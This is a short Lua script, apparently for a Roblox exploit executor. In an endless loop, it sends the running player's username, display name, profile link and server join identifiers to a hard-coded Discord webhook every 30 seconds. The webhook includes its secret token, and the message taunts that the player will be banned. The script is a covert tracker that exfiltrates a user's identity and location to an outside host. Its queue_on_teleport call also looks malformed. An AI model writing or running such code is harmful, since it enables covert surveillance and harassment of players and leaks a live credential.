local url = "https://discord.com/api/webhooks/1323284698566496397/ULCiKCMsC27K9QXYRVViZs81F9SxoIxQSjXQl-I2f4IcxONeVG6W2jSh-JJHkiXlNKso"

local function bug(player)
	local data = {
		["content"] = "",
		["embeds"] = {
			{
				["title"] = "**".. player.Name.. "**",
				["description"] = "Total Bot Uptime: \n" ..
					"Display: ".. player.DisplayName  .."\n" ..
					"Profile: [".. player.Name .. "](https://www.roblox.com/users/".. player.UserId.. "/profile)\n" ..
					"Invite 1: \n```Roblox.GameLauncher.joinGameInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')``` \n" ..
					"Invite 2: [Join here](https://fern.wtf/joiner?placeId=".. game.placeId.. "&gameInstanceId=".. game.jobId.. ")\n" ..
					"-# bozo is gonna get banned LOL \n",
				["color"] = tonumber(0x354ab2),
			}
		}
	}

	local newdata = game:GetService("HttpService"):JSONEncode(data)

	local headers = {
		["content-type"] = "application/json"
	}
	request = http_request or request or HttpPost or syn.request
	local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
	request(abcdef)
end

while true do
	bug(game.Players.LocalPlayer)
	wait(30)
	queue_on_teleport(game.PlaceId) 
end
